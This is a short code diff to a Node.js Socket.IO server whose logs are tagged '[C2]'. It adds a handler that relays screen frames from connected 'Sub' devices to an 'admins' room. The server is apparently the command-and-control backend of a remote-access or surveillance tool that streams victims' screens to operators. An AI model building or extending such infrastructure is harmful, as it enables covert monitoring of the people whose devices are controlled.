@@ -99,6 +99,11 @@ io.on('connection', (socket) => {
         io.to('admins').emit('chat_reply', { from: subId, text: data.text });
     });
 
+    // Relay screen stream from Sub to Admin
+    socket.on('screen_frame', (data) => {
+        io.to('admins').emit('screen_frame', data);
+    });
+
     socket.on('disconnect', () => {
         console.log(`[C2] Disconnected: ${socket.id}`);
         if (connectedDevices[socket.id]) {
